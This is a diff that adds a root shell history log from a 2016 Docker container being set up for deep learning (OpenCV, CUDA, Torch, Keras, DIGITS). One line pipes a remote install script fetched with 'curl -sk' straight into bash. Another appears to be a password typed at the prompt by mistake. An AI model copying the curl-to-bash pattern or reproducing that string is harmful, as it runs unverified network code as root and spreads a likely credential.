@@ -1,0 +1,1412 @@
+exit ### @4f5dbda04bfa /dev/pts/0 20161028 19:23 /notebooks
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 19:24 /notebooks
+vi ~/histlog  ### @4f5dbda04bfa /dev/pts/0 20161028 19:24 /notebooks
+apt-get update ### @4f5dbda04bfa /dev/pts/0 20161028 19:24 /notebooks
+apt-get install vim ### @4f5dbda04bfa /dev/pts/0 20161028 19:25 /notebooks
+apt-get install vim ### @4f5dbda04bfa /dev/pts/0 20161028 19:44 /notebooks
+apt-get install vim ### @4f5dbda04bfa /dev/pts/0 20161028 19:44 /notebooks
+export DEBIAN_FRONTEND=noninteractive ### @4f5dbda04bfa /dev/pts/0 20161028 19:44 /notebooks
+sudo apt-get install -y libncurses-dev ### @4f5dbda04bfa /dev/pts/0 20161028 19:44 /notebooks
+sudo apt-get install -y gfortran ### @4f5dbda04bfa /dev/pts/0 20161028 19:44 /notebooks
+sudo apt-get update -y  ### @4f5dbda04bfa /dev/pts/0 20161028 19:45 /notebooks
+sudo apt-get install -y python-dev python-pip htop ### @4f5dbda04bfa /dev/pts/0 20161028 19:45 /notebooks
+pip install -U pip ### @4f5dbda04bfa /dev/pts/0 20161028 19:46 /notebooks
+pip install -U circus circus-web Cython Pillow ### @4f5dbda04bfa /dev/pts/0 20161028 19:46 /notebooks
+pip install -U circus circus-web Cython Pillow ### @4f5dbda04bfa /dev/pts/0 20161028 19:46 /notebooks
+pip install -U circus circus-web Cython Pillow ### @4f5dbda04bfa /dev/pts/0 20161028 19:46 /notebooks
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 19:46 /notebooks
+# Checkout this project to access installation script and additional resources ### @4f5dbda04bfa /dev/pts/0 20161028 19:47 /notebooks
+if [ ! -d "dl-machine" ]; then     git clone git@github.com:deeplearningparis/dl-machine.git;     (cd dl-machine && git remote add http https://github.com/deeplearningparis/dl-machine.git); else     if  [ "$1" == "reset" ]; then         (cd dl-machine && git reset --hard && git checkout master && git pull --rebase $REMOTE master);     fi; fi ### @4f5dbda04bfa /dev/pts/0 20161028 19:47 /notebooks
+cd~/ ### @4f5dbda04bfa /dev/pts/0 20161028 19:47 /notebooks
+cd ~/ ### @4f5dbda04bfa /dev/pts/0 20161028 19:47 /notebooks -> /root
+if [ ! -d "dl-machine" ]; then     git clone git@github.com:deeplearningparis/dl-machine.git;     (cd dl-machine && git remote add http https://github.com/deeplearningparis/dl-machine.git); else     if  [ "$1" == "reset" ]; then         (cd dl-machine && git reset --hard && git checkout master && git pull --rebase $REMOTE master);     fi; fi ### @4f5dbda04bfa /dev/pts/0 20161028 19:47 /root
+git clone git@github.com:deeplearningparis/dl-machine.git ### @4f5dbda04bfa /dev/pts/0 20161028 19:47 /root
+sudo apt-get install git-all ### @4f5dbda04bfa /dev/pts/0 20161028 19:53 /root
+if [ ! -d "dl-machine" ]; then     git clone git@github.com:deeplearningparis/dl-machine.git;     (cd dl-machine && git remote add http https://github.com/deeplearningparis/dl-machine.git); else     if  [ "$1" == "reset" ]; then         (cd dl-machine && git reset --hard && git checkout master && git pull --rebase $REMOTE master);     fi; fi ### @4f5dbda04bfa /dev/pts/0 20161028 19:55 /root
+git clone git@github.com:deeplearningparis/dl-machine.git ### @4f5dbda04bfa /dev/pts/0 20161028 19:55 /root
+git clone git@github.com:deeplearningparis/dl-machine.git ### @4f5dbda04bfa /dev/pts/0 20161028 19:57 /root
+git clone ramakrishna-git@github.com:deeplearningparis/dl-machine.git ### @4f5dbda04bfa /dev/pts/0 20161028 19:58 /root
+git clone https://github.com/deeplearningparis/dl-machine.git ### @4f5dbda04bfa /dev/pts/0 20161028 19:59 /root
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 19:59 /root
+if [ ! -d "dl-machine" ]; then     git clone git@github.com:deeplearningparis/dl-machine.git;     (cd dl-machine && git remote add http https://github.com/deeplearningparis/dl-machine.git); else     if  [ "$1" == "reset" ]; then         (cd dl-machine && git reset --hard && git checkout master && git pull --rebase $REMOTE master);     fi; fi ### @4f5dbda04bfa /dev/pts/0 20161028 19:59 /root
+rm -f ~/.numpy-site.cfg ### @4f5dbda04bfa /dev/pts/0 20161028 19:59 /root
+ln -s dl-machine/numpy-site.cfg ~/.numpy-site.cfg ### @4f5dbda04bfa /dev/pts/0 20161028 19:59 /root
+pip install -U numpy ### @4f5dbda04bfa /dev/pts/0 20161028 19:59 /root
+rm -f ~/.scipy-site.cfg ### @4f5dbda04bfa /dev/pts/0 20161028 20:00 /root
+ln -s dl-machine/scipy-site.cfg ~/.scipy-site.cfg ### @4f5dbda04bfa /dev/pts/0 20161028 20:00 /root
+pip install -U scipy ### @4f5dbda04bfa /dev/pts/0 20161028 20:00 /root
+pip install pyopenssl ndg-httpsclient pyasn1 ### @4f5dbda04bfa /dev/pts/0 20161028 20:01 /root
+apt-get install libffi-dev libssl-dev ### @4f5dbda04bfa /dev/pts/0 20161028 20:02 /root
+pip install pyopenssl ndg-httpsclient pyasn1 ### @4f5dbda04bfa /dev/pts/0 20161028 20:02 /root
+rm -f ~/.numpy-site.cfg ### @4f5dbda04bfa /dev/pts/0 20161028 20:02 /root
+ln -s dl-machine/numpy-site.cfg ~/.numpy-site.cfg ### @4f5dbda04bfa /dev/pts/0 20161028 20:02 /root
+pip install -U numpy ### @4f5dbda04bfa /dev/pts/0 20161028 20:02 /root
+rm -f ~/.scipy-site.cfg ### @4f5dbda04bfa /dev/pts/0 20161028 20:02 /root
+ln -s dl-machine/scipy-site.cfg ~/.scipy-site.cfg ### @4f5dbda04bfa /dev/pts/0 20161028 20:02 /root
+pip install -U scipy ### @4f5dbda04bfa /dev/pts/0 20161028 20:03 /root
+sudo apt-get install -y libfreetype6-dev libpng12-dev ### @4f5dbda04bfa /dev/pts/0 20161028 20:03 /root
+sudo apt-get install -y libfreetype6-dev libpng12-dev ### @4f5dbda04bfa /dev/pts/0 20161028 20:03 /root
+pip install -U matplotlib ipython[all] pandas scikit-image ### @4f5dbda04bfa /dev/pts/0 20161028 20:03 /root
+pip install -e git+git://github.com/scikit-learn/scikit-learn.git#egg=scikit-learn ### @4f5dbda04bfa /dev/pts/0 20161028 20:08 /root
+exit ### @4f5dbda04bfa /dev/pts/0 20161028 20:08 /notebooks
+exit ### @4f5dbda04bfa /dev/pts/0 20161028 20:08 /notebooks
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 /notebooks
+cd / ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 /notebooks -> /
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 /
+pwd ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 /root
+pwd ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 /
+cd root/ ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 / -> /root
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 /root
+cd ~/ ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 /root -> /root
+sudo apt-get -y install libopencv-dev build-essential cmake git libgtk2.0-dev    pkg-config python-dev python-numpy libdc1394-22 libdc1394-22-dev libjpeg-dev    libpng12-dev libtiff4-dev libjasper-dev libavcodec-dev libavformat-dev    libswscale-dev libxine-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev    libv4l-dev libtbb-dev libqt4-dev libfaac-dev libmp3lame-dev libopencore-amrnb-dev    libopencore-amrwb-dev libtheora-dev libvorbis-dev libxvidcore-dev x264 v4l-utils unzip ### @4f5dbda04bfa /dev/pts/0 20161028 20:09 /root
+vim /etc/apt/sources.list ### @4f5dbda04bfa /dev/pts/0 20161028 20:10 /root
+vim /etc/apt/sources.list ### @4f5dbda04bfa /dev/pts/0 20161028 20:11 /root
+echo "deb http://archive.ubuntu.com/ubuntu natty main restricted universe multiverse" >> /etc/apt/sources.list ### @4f5dbda04bfa /dev/pts/0 20161028 20:11 /root
+sudo apt-get update && sudo apt-get install libfaac-dev ### @4f5dbda04bfa /dev/pts/0 20161028 20:11 /root
+sudo apt-get -y install libopencv-dev build-essential cmake git libgtk2.0-dev    pkg-config python-dev python-numpy libdc1394-22 libdc1394-22-dev libjpeg-dev    libpng12-dev libtiff4-dev libjasper-dev libavcodec-dev libavformat-dev    libswscale-dev libxine-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev    libv4l-dev libtbb-dev libqt4-dev libfaac-dev libmp3lame-dev libopencore-amrnb-dev    libopencore-amrwb-dev libtheora-dev libvorbis-dev libxvidcore-dev x264 v4l-utils unzip ### @4f5dbda04bfa /dev/pts/0 20161028 20:12 /root
+sudo apt-get -y install libopencv-dev build-essential cmake git libgtk2.0-dev    pkg-config python-dev python-numpy libdc1394-22 libdc1394-22-dev libjpeg-dev    libpng12-dev libtiff4-dev libjasper-dev libavcodec-dev libavformat-dev    libswscale-dev libxine-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev    libv4l-dev libtbb-dev libqt4-dev libfaac-dev libmp3lame-dev libopencore-amrnb-dev    libopencore-amrwb-dev libtheora-dev libvorbis-dev libxvidcore-dev x264 v4l-utils unzip ### @4f5dbda04bfa /dev/pts/0 20161028 20:12 /root
+vim /etc/apt/sources.list ### @4f5dbda04bfa /dev/pts/0 20161028 20:12 /root
+vim /etc/apt/sources.list ### @4f5dbda04bfa /dev/pts/0 20161028 20:14 /root
+sudo apt-get -y install libopencv-dev build-essential cmake git libgtk2.0-dev    pkg-config python-dev python-numpy libdc1394-22 libdc1394-22-dev libjpeg-dev    libpng12-dev libtiff4-dev libjasper-dev libavcodec-dev libavformat-dev    libswscale-dev libxine-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev    libv4l-dev libtbb-dev libqt4-dev libfaac-dev libmp3lame-dev libopencore-amrnb-dev    libopencore-amrwb-dev libtheora-dev libvorbis-dev libxvidcore-dev x264 v4l-utils unzip ### @4f5dbda04bfa /dev/pts/0 20161028 20:14 /root
+sudo apt-get update && sudo apt-get install libfaac-dev ### @4f5dbda04bfa /dev/pts/0 20161028 20:15 /root
+sudo apt-get -y install libopencv-dev build-essential cmake git libgtk2.0-dev    pkg-config python-dev python-numpy libdc1394-22 libdc1394-22-dev libjpeg-dev    libpng12-dev libtiff4-dev libjasper-dev libavcodec-dev libavformat-dev    libswscale-dev libxine-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev    libv4l-dev libtbb-dev libqt4-dev libfaac-dev libmp3lame-dev libopencore-amrnb-dev    libopencore-amrwb-dev libtheora-dev libvorbis-dev libxvidcore-dev x264 v4l-utils unzip ### @4f5dbda04bfa /dev/pts/0 20161028 20:22 /root
+wget https://github.com/Itseez/opencv/archive/3.0.0.tar.gz -O opencv-3.0.0.tar.gz ### @4f5dbda04bfa /dev/pts/0 20161028 20:23 /root
+tar -zxvf  opencv-3.0.0.tar.gz ### @4f5dbda04bfa /dev/pts/0 20161028 20:23 /root
+apt-get install wget ### @4f5dbda04bfa /dev/pts/0 20161028 20:23 /root
+wget https://github.com/Itseez/opencv/archive/3.0.0.tar.gz -O opencv-3.0.0.tar.gz ### @4f5dbda04bfa /dev/pts/0 20161028 20:25 /root
+wget https://github.com/Itseez/opencv/archive/3.1.0.tar.gz -O opencv-3.1.0.tar.gz ### @4f5dbda04bfa /dev/pts/0 20161028 20:28 /root
+tar -zxvf  opencv-3.0.0.tar.gz ### @4f5dbda04bfa /dev/pts/0 20161028 20:28 /root
+cd opencv-3.0.0 ### @4f5dbda04bfa /dev/pts/0 20161028 20:29 /root -> /root/opencv-3.0.0
+mkdir build ### @4f5dbda04bfa /dev/pts/0 20161028 20:29 /root/opencv-3.0.0
+cd build ### @4f5dbda04bfa /dev/pts/0 20161028 20:29 /root/opencv-3.0.0 -> /root/opencv-3.0.0/build
+cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local -D WITH_TBB=ON -D BUILD_NEW_PYTHON_SUPPORT=ON -D WITH_V4L=ON -D WITH_QT=ON -D WITH_OPENGL=ON .. ### @4f5dbda04bfa /dev/pts/0 20161028 20:30 /root/opencv-3.0.0/build
+make -j $(nproc) ### @4f5dbda04bfa /dev/pts/0 20161028 20:39 /root/opencv-3.0.0/build
+sudo make install ### @4f5dbda04bfa /dev/pts/0 20161028 20:40 /root/opencv-3.0.0/build
+cd .. ### @4f5dbda04bfa /dev/pts/0 20161028 20:42 /root/opencv-3.0.0/build -> /root/opencv-3.0.0
+cd .. ### @4f5dbda04bfa /dev/pts/0 20161028 20:42 /root/opencv-3.0.0 -> /root
+tar -zxvf  opencv-3.1.0.tar.gz ### @4f5dbda04bfa /dev/pts/0 20161028 20:42 /root
+cd opencv-3.1.0 ### @4f5dbda04bfa /dev/pts/0 20161028 20:42 /root -> /root/opencv-3.1.0
+mkdir build ### @4f5dbda04bfa /dev/pts/0 20161028 20:42 /root/opencv-3.1.0
+cd build ### @4f5dbda04bfa /dev/pts/0 20161028 20:42 /root/opencv-3.1.0 -> /root/opencv-3.1.0/build
+cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local -D WITH_TBB=ON -D BUILD_NEW_PYTHON_SUPPORT=ON -D WITH_V4L=ON -D WITH_QT=ON -D WITH_OPENGL=ON .. ### @4f5dbda04bfa /dev/pts/0 20161028 20:43 /root/opencv-3.1.0/build
+make -j $(nproc) ### @4f5dbda04bfa /dev/pts/0 20161028 20:52 /root/opencv-3.1.0/build
+sudo make install ### @4f5dbda04bfa /dev/pts/0 20161028 20:53 /root/opencv-3.1.0/build
+cd /opt/opencv-build &&     git clone https://github.com/Itseez/opencv.git &&     cd /opt/opencv-build/opencv &&     git checkout 3.1.0 &&     git format-patch -1 10896129b39655e19e4e7c529153cb5c2191a1db &&     git am < 0001-GraphCut-deprecated-in-CUDA-7.5-and-removed-in-8.0.patch ### @4f5dbda04bfa /dev/pts/0 20161028 20:53 /root/opencv-3.1.0 -> /root/opencv-3.1.0/build
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 20:53 /root/opencv-3.1.0/build
+cd .. ### @4f5dbda04bfa /dev/pts/0 20161028 20:54 /root/opencv-3.1.0/build -> /root/opencv-3.1.0
+git format-patch -1 10896129b39655e19e4e7c529153cb5c2191a1db && >     git am < 0001-GraphCut-deprecated-in-CUDA-7.5-and-removed-in-8.0.patch ### @4f5dbda04bfa /dev/pts/0 20161028 20:54 /root/opencv-3.1.0
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 20:54 /root/opencv-3.1.0
+cd .. ### @4f5dbda04bfa /dev/pts/0 20161028 20:54 /root/opencv-3.1.0 -> /root
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 20:54 /root
+mkdir /opt/opencv-build ### @4f5dbda04bfa /dev/pts/0 20161028 20:57 /root
+cd /opt/opencv-build &&     git clone https://github.com/Itseez/opencv.git &&     cd /opt/opencv-build/opencv &&     git checkout 3.1.0 &&     git format-patch -1 10896129b39655e19e4e7c529153cb5c2191a1db &&     git am < 0001-GraphCut-deprecated-in-CUDA-7.5-and-removed-in-8.0.patch ### @4f5dbda04bfa /dev/pts/0 20161028 20:58 /opt/opencv-build -> /opt/opencv-build/opencv
+ls ### @4f5dbda04bfa /dev/pts/0 20161028 20:58 /opt/opencv-build/opencv
+mkdir build ### @4f5dbda04bfa /dev/pts/0 20161028 20:59 /opt/opencv-build/opencv
+cd build ### @4f5dbda04bfa /dev/pts/0 20161028 20:59 /opt/opencv-build/opencv -> /opt/opencv-build/opencv/build
+cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local -D WITH_TBB=ON -D BUILD_NEW_PYTHON_SUPPORT=ON -D WITH_V4L=ON -D WITH_QT=ON -D WITH_OPENGL=ON .. ### @4f5dbda04bfa /dev/pts/0 20161028 20:59 /opt/opencv-build/opencv/build
+make -j $(nproc) ### @4f5dbda04bfa /dev/pts/0 20161028 21:08 /opt/opencv-build/opencv/build
+sudo make install ### @4f5dbda04bfa /dev/pts/0 20161028 21:09 /opt/opencv-build/opencv/build
+ubuntu --version ### @4f5dbda04bfa /dev/pts/0 20161028 21:14 /opt/opencv-build/opencv/build
+lsb_release -a ### @4f5dbda04bfa /dev/pts/0 20161028 21:14 /opt/opencv-build/opencv/build
+lsb_release -a ### @4f5dbda04bfa /dev/pts/0 20161028 21:15 /opt/opencv-build/opencv/build
+wget http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1404/x86_64/cuda-repo-ubuntu1404_8.0.44-1_amd64.deb ### @4f5dbda04bfa /dev/pts/0 20161028 21:17 /opt/opencv-build/opencv/build
+sudo dpkg -i cuda-repo-ubuntu1404_8.0.44-1_amd64.deb  ### @4f5dbda04bfa /dev/pts/0 20161028 21:17 /opt/opencv-build/opencv/build
+echo -e "\nexport CUDA_HOME=/usr/local/cuda\nexport CUDA_ROOT=/usr/local/cuda" >> ~/.bashrc ### @4f5dbda04bfa /dev/pts/0 20161028 21:18 /opt/opencv-build/opencv/build
+echo -e "\nexport PATH=/usr/local/cuda/bin:\$PATH\nexport LD_LIBRARY_PATH=/usr/local/cuda/lib64:\$LD_LIBRARY_PATH" >> ~/.bashrc ### @4f5dbda04bfa /dev/pts/0 20161028 21:18 /opt/opencv-build/opencv/build
+echo -e "\nexport PATH=/usr/local/cuda/bin:\$PATH\nexport LD_LIBRARY_PATH=/usr/local/cuda/lib64:\$LD_LIBRARY_PATH" >> ~/.bashrc ### @4f5dbda04bfa /dev/pts/0 20161028 21:18 /opt/opencv-build/opencv/build
+echo "CUDA installation complete: please reboot your machine and continue with script #2" ### @4f5dbda04bfa /dev/pts/0 20161028 21:18 /opt/opencv-build/opencv/build
+cd /opt/nvidia_installers ### @4f5dbda04bfa /dev/pts/0 20161028 21:26 /notebooks -> /root
+cd /opt/nvidia_installers ### @4f5dbda04bfa /dev/pts/0 20161028 21:26 /notebooks -> /root
+cd /opt/nvidia_installers ### @4f5dbda04bfa /dev/pts/0 20161028 21:26 /notebooks -> /root
+cd /opt/nvidia_installers ### @4f5dbda04bfa /dev/pts/0 20161028 21:31 /notebooks -> /root
+exit ### @4f5dbda04bfa not a tty 20161029 12:26 /notebooks
+ls ### @4f5dbda04bfa not a tty 20161029 12:26 /notebooks
+ls ### @4f5dbda04bfa not a tty 20161029 12:26 /notebooks
+cd .. ### @4f5dbda04bfa not a tty 20161029 12:26 /notebooks -> /
+ls ### @4f5dbda04bfa not a tty 20161029 12:26 /
+cd root/ ### @4f5dbda04bfa not a tty 20161029 12:26 / -> /root
+ls ### @4f5dbda04bfa not a tty 20161029 12:26 /root
+mkdir opencv ### @4f5dbda04bfa not a tty 20161029 12:26 /root
+rmdir opencv ### @4f5dbda04bfa not a tty 20161029 12:27 /root
+git clone ### @4f5dbda04bfa not a tty 20161029 12:27 /root
+git clone https://github.com/opencv/opencv.git ### @4f5dbda04bfa not a tty 20161029 12:28 /root
+ls ### @4f5dbda04bfa not a tty 20161029 12:28 /root
+exit ### @4f5dbda04bfa not a tty 20161029 12:29 /notebooks
+ls ### @4f5dbda04bfa not a tty 20161029 12:29 /notebooks
+cd ../root/opencv ### @4f5dbda04bfa not a tty 20161029 12:29 /notebooks -> /root/opencv
+ls ### @4f5dbda04bfa not a tty 20161029 12:29 /root/opencv
+mkdir build ### @4f5dbda04bfa not a tty 20161029 12:29 /root/opencv
+cd build/ ### @4f5dbda04bfa not a tty 20161029 12:29 /root/opencv -> /root/opencv/build
+cd build/ ### @4f5dbda04bfa not a tty 20161029 12:29 /root/opencv -> /root/opencv/build
+cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local -D WITH_TBB=ON -D BUILD_NEW_PYTHON_SUPPORT=ON -D WITH_V4L=ON -D WITH_QT=ON -D WITH_OPENGL=ON .. ### @4f5dbda04bfa not a tty 20161029 12:30 /root/opencv/build
+make -j $(nproc) ### @4f5dbda04bfa not a tty 20161029 13:16 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:21 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:38 /root/opencv/build
+sudo make install ### @4f5dbda04bfa not a tty 20161029 13:40 /root/opencv/build
+K4n2tZAL ### @4f5dbda04bfa not a tty 20161029 13:40 /root/opencv/build
+pkg-config opencv --cflags ### @4f5dbda04bfa not a tty 20161029 13:41 /root/opencv/build
+pkg-config opencv --libs ### @4f5dbda04bfa not a tty 20161029 13:41 /root/opencv/build
+pkg-config --modversion opencv  ### @4f5dbda04bfa not a tty 20161029 13:41 /root/opencv/build
+sudo /bin/bash -c 'echo "/usr/local/lib" > /etc/ld.so.conf.d/opencv.conf' ### @4f5dbda04bfa not a tty 20161029 13:45 /root/opencv/build
+sudo ldconfig ### @4f5dbda04bfa not a tty 20161029 13:45 /root/opencv/build
+ln -s /usr/lib/python2.7/dist-packages/cv2.so /home/$orig_executor/venv/lib/python2.7/site-packages/cv2.so ### @4f5dbda04bfa not a tty 20161029 13:45 /root/opencv/build
+ln -s /usr/lib/python2.7/dist-packages/cv2.so /home/$orig_executor/venv/lib/python2.7/site-packages/cv2.so ### @4f5dbda04bfa not a tty 20161029 13:45 /root/opencv/build
+ln -s /usr/lib/python2.7/dist-packages/cv2.so /home/$orig_executor/venv/lib/python2.7/site-packages/cv2.so ### @4f5dbda04bfa not a tty 20161029 13:45 /root/opencv/build
+ls /home/ ### @4f5dbda04bfa not a tty 20161029 13:47 /root/opencv/build
+pwd ### @4f5dbda04bfa not a tty 20161029 13:47 /root/opencv/build
+ls ~/ ### @4f5dbda04bfa not a tty 20161029 13:47 /root/opencv/build
+ls /home/ ### @4f5dbda04bfa not a tty 20161029 13:47 /root/opencv/build
+ls /home/ ### @4f5dbda04bfa not a tty 20161029 13:48 /root/opencv/build
+ls /home/ ### @4f5dbda04bfa not a tty 20161029 13:48 /root/opencv/build
+ls /home/ ### @4f5dbda04bfa not a tty 20161029 13:48 /root/opencv/build
+cd / ### @4f5dbda04bfa not a tty 20161029 13:50 /root/opencv/build -> /
+find . -name cv2.so ### @4f5dbda04bfa not a tty 20161029 13:50 /
+cd - ### @4f5dbda04bfa not a tty 20161029 13:50 / -> /root/opencv/build
+cd - ### @4f5dbda04bfa not a tty 20161029 13:52 /root/opencv/build -> /
+find . -name venv ### @4f5dbda04bfa not a tty 20161029 13:52 /
+#### error running command ln -s /usr/lib/python2.7/dist-packages/cv2.so /home/$orig_executor/venv/lib/python2.7/site-packages/cv2.so ### @4f5dbda04bfa not a tty 20161029 13:53 /
+#### error running command ln -s /usr/lib/python2.7/dist-packages/cv2.so /home/$orig_executor/venv/lib/python2.7/site-packages/cv2.so ### @4f5dbda04bfa not a tty 20161029 13:53 /
+echo "opencv 3.0 installed" ### @4f5dbda04bfa not a tty 20161029 13:53 /
+echo "opencv 3.1 installed" ### @4f5dbda04bfa not a tty 20161029 13:53 /
+pip install -e git+git://github.com/Theano/Theano.git#egg=Theano ### @4f5dbda04bfa not a tty 20161029 13:54 /
+if [ ! -f ".theanorc" ]; then     ln -s ~/dl-machine/theanorc ~/.theanorc; fi ### @4f5dbda04bfa not a tty 20161029 13:54 /
+if [ ! -d "DL4H" ]; then     git clone git@github.com:SnippyHolloW/DL4H.git;     (cd DL4H && git remote add http https://github.com/SnippyHolloW/DL4H.git); else     if  [ "$1" == "reset" ]; then         (cd DL4H && git reset --hard && git checkout master && git pull --rebase $REMOTE master);     fi; fi ### @4f5dbda04bfa not a tty 20161029 13:58 /
+git clone https://github.com:SnippyHolloW/DL4H.git ### @4f5dbda04bfa not a tty 20161029 13:58 /
+git clone https://github.com/SnippyHolloW/DL4H.git ### @4f5dbda04bfa not a tty 20161029 14:44 /
+if [ ! -d "DL4H" ]; then     git clone git@github.com:SnippyHolloW/DL4H.git;     (cd DL4H && git remote add http https://github.com/SnippyHolloW/DL4H.git); else     if  [ "$1" == "reset" ]; then         (cd DL4H && git reset --hard && git checkout master && git pull --rebase $REMOTE master);     fi; fi ### @4f5dbda04bfa not a tty 20161029 14:44 /
+cd DL4H/ ### @4f5dbda04bfa not a tty 20161029 14:44 / -> /DL4H
+git remote add http https://github.com/SnippyHolloW/DL4H.git ### @4f5dbda04bfa not a tty 20161029 14:45 /DL4H
+curl -sk https://raw.githubusercontent.com/torch/ezinstall/master/install-deps | bash ### @4f5dbda04bfa not a tty 20161029 14:46 /DL4H
+    git clone https://github.com/torch/distro.git ~/torch --recursive ### @4f5dbda04bfa not a tty 20161029 14:46 /DL4H
+    (cd ~/torch && yes | ./install.sh) ### @4f5dbda04bfa not a tty 20161029 14:53 /DL4H
+    (cd ~/torch && yes | ./install.sh) ### @4f5dbda04bfa not a tty 20161029 14:53 /DL4H
+    (cd ~/torch && yes | ./install.sh) ### @4f5dbda04bfa not a tty 20161029 14:53 /DL4H
+if [ ! -d "iTorch" ]; then     git clone git@github.com:facebook/iTorch.git;     (cd iTorch && git remote add http https://github.com/facebook/iTorch.git); else     if  [ "$1" == "reset" ]; then         (cd iTorch && git reset --hard && git checkout master && git pull --rebase $REMOTE master);     fi; fi ### @4f5dbda04bfa not a tty 20161029 14:54 /DL4H
+(cd iTorch && luarocks make) ### @4f5dbda04bfa not a tty 20161029 14:54 /DL4H
+(cd iTorch && luarocks make) ### @4f5dbda04bfa not a tty 20161029 14:54 /DL4H
+git clone https://github.com/facebook/iTorch.git ### @4f5dbda04bfa not a tty 20161029 14:55 /DL4H
+cd iTorch && git remote add http https://github.com/facebook/iTorch.git ### @4f5dbda04bfa not a tty 20161029 14:55 /DL4H -> /DL4H/iTorch
+cd iTorch && luarocks make ### @4f5dbda04bfa not a tty 20161029 14:55 /DL4H -> /DL4H/iTorch
+ls ### @4f5dbda04bfa not a tty 20161029 14:56 /DL4H/iTorch
+cd .. ### @4f5dbda04bfa not a tty 20161029 14:56 /DL4H/iTorch -> /DL4H
+cd .. ### @4f5dbda04bfa not a tty 20161029 14:56 /DL4H -> /
+ls ### @4f5dbda04bfa not a tty 20161029 14:56 /
+git clone https://github.com/fchollet/keras.git ### @4f5dbda04bfa not a tty 20161029 14:56 /
+cd keras ### @4f5dbda04bfa not a tty 20161029 14:57 / -> /keras
+python setup.py install ### @4f5dbda04bfa not a tty 20161029 14:57 /keras
+echo "Keras installed" ### @4f5dbda04bfa not a tty 20161029 14:58 /keras
+ls ### @4f5dbda04bfa /dev/pts/0 20161029 15:00 /root
+ls ### @4f5dbda04bfa not a tty 20161029 15:00 /keras
+cd .. ### @4f5dbda04bfa not a tty 20161029 15:00 /keras -> /
+ls ### @4f5dbda04bfa not a tty 20161029 15:00 /
+pwd ### @4f5dbda04bfa not a tty 20161029 15:00 /
+cd / ### @4f5dbda04bfa /dev/pts/0 20161029 15:00 /root -> /
+ls ### @4f5dbda04bfa /dev/pts/0 20161029 15:00 /
+pwd ### @4f5dbda04bfa not a tty 20161029 15:02 /
+ls ### @4f5dbda04bfa /dev/pts/0 20161029 18:49 /
+ls /dockermountedspace/ ### @4f5dbda04bfa /dev/pts/0 20161029 20:25 /
+ls ### @4f5dbda04bfa /dev/pts/0 20161029 20:25 /
+ls dockermountedspace/ ### @4f5dbda04bfa /dev/pts/0 20161029 20:25 /
+ls dockermountedspace/ ### @4f5dbda04bfa /dev/pts/0 20161029 20:27 /
+ln -s /dockermountedspace/ /notebooks/dockermountedspaceln ### @4f5dbda04bfa /dev/pts/0 20161029 20:28 /
+vi ~/.keras/keras.json  ### @4f5dbda04bfa /dev/pts/0 20161029 20:30 /
+vim ~/.keras/keras.json  ### @4f5dbda04bfa /dev/pts/0 20161029 20:31 /
+pwd ### @4f5dbda04bfa not a tty 20161029 20:31 /
+vim ~/.keras/keras.json  ### @4f5dbda04bfa not a tty 20161029 20:32 /
+vim ~/.keras/keras.json  ### @4f5dbda04bfa not a tty 20161029 20:35 /
+:q ### @4f5dbda04bfa not a tty 20161029 20:46 /
+:q ### @4f5dbda04bfa not a tty 20161029 20:48 /
+docker ps ### @4f5dbda04bfa not a tty 20161029 20:48 /
+pip install h5py ### @4f5dbda04bfa /dev/pts/0 20161029 20:57 /
+cd ~/ ### @4f5dbda04bfa /dev/pts/0 20161029 21:02 / -> /root
+cd ~/ ### @4f5dbda04bfa /dev/pts/0 20161029 21:02 / -> /root
+git clone https://github.com/NVIDIA/DIGITS.git digits ### @4f5dbda04bfa /dev/pts/0 20161029 21:02 /root
+git clone https://github.com/NVIDIA/DIGITS.git digits ### @4f5dbda04bfa /dev/pts/0 20161029 21:02 /root
